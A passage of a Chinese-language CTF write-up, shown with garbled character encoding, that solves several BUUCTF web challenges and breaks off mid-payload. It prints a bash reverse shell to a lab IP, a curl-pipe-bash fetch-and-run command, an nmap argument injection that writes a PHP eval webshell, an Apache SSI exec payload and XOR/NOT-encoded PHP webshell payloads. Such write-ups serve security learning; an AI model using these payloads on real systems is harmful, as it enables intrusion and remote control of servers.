href="https://www.cnblogs.com/yanguhung/p/10115911.html">curlå‘½ä»¤å‚è€ƒ</a>ï¼Œäºæ˜¯é€‰æ‹©ç”¨<code>curl</code>æŒ‡ä»¤æ¥curlè¿œç¨‹ä¸»æœºä¸Šçš„æ–‡ä»¶ç„¶åå†ç”¨ç®¡é“ç¬¦<code>| bash</code>æ¥æ‰§è¡Œ<code>curl</code>ä¸‹æ¥çš„å†…å®¹</p><p>ç”±äº<code>buu</code>ä¸Šé¢çš„é¶æœºæ— æ³•è®¿é—®å¤–ç½‘ï¼Œåˆ›ä¸ªå°å·å¼€å°å¯ä»¥ç”¨çš„é¶æœºï¼ˆé¶æœºå·²ç»è£…å¥½äº†LAMPï¼‰ï¼Œç”±äºéƒ½æ˜¯åœ¨ä¸€ä¸ªå†…ç½‘ï¼Œæ‰€ä»¥é¶æœºä¹‹é—´å¯ä»¥äº’ç›¸è®¿é—®</p><p><code>ssh</code>ç™»å½•<code>ssh -p 29722 root@node3.buuoj.cn</code></p><p>è¾“å…¥å¯†ç è¿›å»ååœ¨<code>/var/www/html</code>ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª<code>txt</code>æ–‡ä»¶ï¼Œé‡Œé¢å†™ä¸Šåå¼¹shellçš„è¯­å¥</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">bash</span> -i <span class="token operator">>&amp;</span> /dev/tcp/174.1.143.177/2333 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></code></pre><p>æ³¨æ„ä¸Šé¢çš„ipåœ°å€ä¸ºå†…ç½‘çš„ipï¼Œæå‰ç”¨ifconfigæŸ¥çœ‹ä¸€ä¸‹å†…ç½‘ipå°±å¯ä»¥äº†ï¼Œ</p><p>ç„¶ååœ¨éœ€è¦åå¼¹shellçš„æœºå­ä¸Špostå‚æ•°ï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token assign-left variable">girl_friend</span><span class="token operator">=</span>curl <span class="token number">174.1</span>.143.177/1.txt <span class="token operator">|</span> <span class="token function">bash</span></code></pre><p>å¯ä»¥çœ‹åˆ°shellè¢«å¼¹è¿‡æ¥äº†ï¼Œç„¶åå¼€å§‹æ‰¾flag</p><p>åœ¨æ ¹ç›®å½•ä¸‹æœ‰ä¸€ä¸ªflagæ–‡ä»¶ï¼Œä½†é‡Œé¢æ”¾çš„ä¸æ˜¯flagï¼Œäºæ˜¯find+grepæŸ¥æ‰¾</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">find</span> etc -name <span class="token string">"*"</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">grep</span> <span class="token string">"flag&#123;"</span></code></pre><p><a href="https://www.runoob.com/linux/linux-comm-xargs.html">xargs</a>ï¼Œæœ€ç»ˆåœ¨<code>etc</code>ä¸­æ‰¾åˆ°äº†flag</p><p>å…³äºåå¼¹shellçš„è§£æå‚è€ƒä»¥ä¸‹æ–‡ç« </p><blockquote><p><a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a>   ï¼ˆLinuxåå¼¹shellï¼ˆä¸€ï¼‰æ–‡ä»¶æè¿°ç¬¦ä¸é‡å®šå‘ï¼‰</p><p><a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a>   ï¼ˆLinux åå¼¹shellï¼ˆäºŒï¼‰åå¼¹shellçš„æœ¬è´¨ï¼‰</p><p><a href="https://www.cnblogs.com/-zhong/p/11398877.html">https://www.cnblogs.com/-zhong/p/11398877.html</a>   ï¼ˆLiunxåå¼¹shellçš„å‡ ç§æ–¹å¼ï¼‰</p></blockquote><h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="BUUCTF-2018-Online Tool"></a>BUUCTF-2018-Online Tool</h3><p>é¦–é¡µæºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glzjin"</span><span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'you are in sandbox '</span><span class="token operator">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token operator">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>å¯ä»¥<code>get</code>ä¸€ä¸ª<code>host</code></p><ul><li><strong>escapeshellarg</strong>ï¼šå°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·</li><li><strong>escapeshellcmd</strong>ï¼šå¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œåæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š <code>*</code> <code>&amp;</code> <code>#</code> <code>;</code> <code>|</code> <code>\</code> <code>*</code> <code>?</code> <code>~</code> <code>&lt;</code> <code>&gt;</code> <code>^</code> <code>(</code> <code>)</code> <code>[</code> <code>]</code> <code>&#123;</code> <code>&#125;</code> <code>$</code>  <code>*</code> <code>,</code> <code>\x0A</code> å’Œ <code>\xFF</code>ã€‚<code>&#39;</code>å’Œ<code>&quot;</code> ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ <em>%</em> å’Œ <em>!</em> å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚</li></ul><p>å‡è®¾ä¼ å…¥<code>172.17.0.2&#39; aaa</code>ï¼Œç»“æœ<code>escapeshellarg</code>å¤„ç†åå˜æˆäº†<code>&#39;172.17.0.2&#39;\&#39;&#39; aaa&#39;</code>,åœ¨å•å¼•å·å‰åŠ äº†ä¸€ä¸ªåæ–œæ è½¬ä¹‰ï¼Œç„¶ååˆå°†è½¬ä¹‰åå•å¼•å·ä¸¤è¾¹çš„å­—ç¬¦ä¸²ç”¨å¼•å·å¼•èµ·æ¥èµ·åˆ°è¿æ¥å­—ç¬¦ä¸²çš„ä½œç”¨ï¼Œéšåç»è¿‡<code>escapeshellcmd</code>å¤„ç†å˜æˆäº†<code>&#39;172.17.0.2&#39;\\&#39;&#39; aaa&#39;</code>ï¼Œ<code>\\</code>è¢«è§£é‡Šä¸º<code>\</code>è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„<code>&#39;</code>æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œåé¢çš„<code>&#39;</code>é…å¯¹æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ï¼Œå¦‚æœæ˜¯<code>ping</code>å‘½ä»¤ï¼Œåˆ™å‘½ä»¤ç®€åŒ–æˆäº†<code>ping 172.17.0.2\ aaa&#39;</code>ï¼Œæœ€ç»ˆå°±ä¼šé€ æˆåˆ©ç”¨</p><p>äºæ˜¯æˆ‘ä»¬é…åˆ<code>nmap</code>çš„<code>-oG</code>å‚æ•°å¯ä»¥å°†æ‰«æçš„ç»“æœç”ŸæˆæŒ‡å®šçš„æ–‡ä»¶</p><p><code>payload</code>ï¼š<code>?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code></p><h3 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="GKCTF2020-CheckIN"></a>GKCTF2020-CheckIN</h3><p>é¦–å…ˆé¢˜ç›®ç»™å‡ºäº†æºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Check_In<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ClassName</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$decode</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> @<span class="token variable">$this</span><span class="token operator">-></span><span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Ginkgo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">decode</span> <span class="token operator">=</span> @<span class="token function">base64_decode</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>                @<span class="token keyword">Eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">decode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">new</span> <span class="token class-name">ClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>å¯ä»¥çœ‹åˆ°å·²ç»ç›¸å½“äºæœ‰ä¸€ä¸ªé©¬åœ¨ä¸Šé¢äº†ï¼Œ <code>@Eval(base64_decode($_REQUEST[&#39;Ginkgo&#39;]));</code></p><p>äºæ˜¯ç›´æ¥ç”¨èšå‰‘è¿æ¥ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525111558751.png" alt loading="lazy"></p><p>æ³¨æ„è¿™é‡Œè‡ªå¸¦çš„base64è§£ç å¥½åƒç”¨ä¸äº†ï¼Œåœ¨ç½‘ä¸Šæ‰¾ä¸€ä¸ªå¯ä»¥ç”¨çš„ï¼Œ<a href="https://github.com/AntSwordProject/AwesomeEncoder/blob/master/php/encoder/b64pass.js">é“¾æ¥</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525111835994.png" alt loading="lazy"></p><p>æ·»åŠ åˆ°<code>AntSword</code>å³å¯è¿æ¥æˆåŠŸ</p><p>è™½ç„¶è¿ä¸Šå»äº†ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°æ ¹ç›®å½•ä¸‹çš„flagï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æƒé™ç›´æ¥è¯»å–flagï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªreadflagå¯æ‰§è¡Œæ–‡ä»¶ï¼Œåº”è¯¥å°±æ˜¯æƒ³åŠæ³•åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶æ¥è¯»å–flagäº†</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525113128509.png" alt loading="lazy"></p><p>ç„¶è€Œæˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥æ‰§è¡Œè¿™ä¸ªreadflagæ–‡ä»¶ï¼Œå› ä¸º<strong>phpinfo</strong>ä¸­çš„<strong>disable_functions</strong>é€‰é¡¹ç¦ç”¨äº†å¾ˆå¤šå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525113418596.png" alt loading="lazy"></p><p>äºæ˜¯æœ‰è¦æƒ³åŠæ³•bypass  disable_functionsæ¥æ‰§è¡Œå‘½ä»¤äº†ï¼Œåœ¨ç½‘ç«™æ‰¾åˆ°å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤çš„expï¼š</p><p><a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a></p><p>ç›´æ¥ä¼ åˆ°ç½‘ç«™çš„tmpç›®å½•ä¸‹ï¼Œæˆ‘ä»¬å…·æœ‰tmpç›®å½•æ‰€æœ‰æƒé™ï¼Œä»¤expä¸­<code>pwn(&quot;/readflag&quot;);</code>å†å‘åŒ…<code>include(&#39;/tmp/exploits.php&#39;);</code>ç»è¿‡base64ç¼–ç åçš„æ•°æ®ï¼Œå³å¯è¯»åˆ°flag</p><h3 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h3><p>è¦ç‚¹-&gt;<strong>Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</strong></p><p>å½“ç›®æ ‡æœåŠ¡å™¨å¼€å¯äº†SSIä¸CGIæ”¯æŒ,æˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ shtml,åˆ©ç”¨<code>&lt;!--#exec cmd=â€idâ€ --&gt;</code>è¯­æ³•æ‰§è¡Œå‘½ä»¤ã€‚</p><p>ä½¿ç”¨SSI(Server Side Include)çš„htmlæ–‡ä»¶æ‰©å±•åï¼ŒSSIï¼ˆServer Side Include)ï¼Œé€šå¸¸ç§°ä¸ºâ€æœåŠ¡å™¨ç«¯åµŒå…¥â€æˆ–è€…å«â€æœåŠ¡å™¨ç«¯åŒ…å«â€ï¼Œæ˜¯ä¸€ç§ç±»ä¼¼äºASPçš„åŸºäºæœåŠ¡å™¨çš„ç½‘é¡µåˆ¶ä½œæŠ€æœ¯ã€‚é»˜è®¤æ‰©å±•åæ˜¯ .stmã€.shtm å’Œ .shtmlã€‚</p><p>index.php.swpæºç æ³„éœ²ï¼Œè®¿é—®å¾—åˆ°æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span><span class="token punctuation">;</span><span class="token variable">$random</span> <span class="token operator">=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//Random 5 times</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$random</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">**</span><span class="token operator">*</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'6d0bc1'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$admin</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('[+] Welcome to manage system')&lt;/script>"</span><span class="token punctuation">;</span>            <span class="token variable">$file_shtml</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"public/"</span><span class="token operator">.</span><span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".shtml"</span><span class="token punctuation">;</span>            <span class="token variable">$shtml</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_shtml</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'            ***            ***            &lt;h1>Hello,'</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/h1>            ******'</span><span class="token punctuation">;</span>            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">**</span><span class="token operator">*</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"[!] Header  error ..."</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('[!] Failed')&lt;/script>"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span>    <span class="token punctuation">&#123;</span><span class="token operator">**</span><span class="token operator">*</span>    <span class="token punctuation">&#125;</span><span class="token operator">**</span><span class="token operator">*</span><span class="token delimiter important">?></span></span></code></pre><p>é¦–å…ˆéœ€è¦ç»•è¿‡<code>if ( $admin == substr(md5($_POST[&#39;password&#39;]),0,6))</code></p><p>å†™ä¸ªç®€å•çš„è„šæœ¬</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">9999999</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'6d0bc1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>å¾—åˆ°ä¸€ä¸ª<code>2020666</code>ï¼Œæ‹¿å»å‘åŒ…</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200808171429367.png" alt="image-20200808171429367" loading="lazy"></p><p>å¾—åˆ°è·¯å¾„</p><p>äºæ˜¯åˆ©ç”¨<strong>Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</strong></p><p>payloadï¼š<code>username=&lt;!--#exec cmd=&quot;cd ..;cat flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password=2020666</code></p><p>è®¿é—®shtmlæ–‡ä»¶å³å¯å¾—åˆ°flag</p><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h3><p>é¦–å…ˆé¢˜ç›®ç»™å‡ºäº†æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">40</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"This is too Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>å¯ä»¥çœ‹åˆ°å¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯è¿‡æ»¤äº†æ‰€æœ‰çš„å­—æ¯å’Œæ•°å­—ï¼Œå¹¶ä¸”é™åˆ¶äº†å­—ç¬¦ä¸²å‘é•¿åº¦ä¸èƒ½å¤§äº40</p><p>äºæ˜¯æ„é€ ç‰¹æ®Šå­—ç¬¦æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼š</p><p>payloadï¼š</p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">1ã€  å¼‚æˆ–æ–¹æ³•$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27])&#96;2ã€  å–åæ–¹æ³•(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%9E%DD%A2%D6%D6);</code></pre><p>ç„¶åç”¨èšå‰‘è¿æ¥ï¼Œæ³¨æ„è¿™é‡Œæ˜¯ä¸èƒ½ç›´æ¥å‘½ä»¤æ‰§è¡Œçš„ï¼Œå› ä¸º<code>disable_function</code>é™åˆ¶äº†å¾ˆå¤šçš„å‘½ä»¤æ‰§è¡Œå‡½æ•°</p><p>ç”¨<code>phpinfo()</code>æŸ¥çœ‹ä¸€ä¸‹</p><p>payloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">91</span><span class="token operator">%</span><span class="token 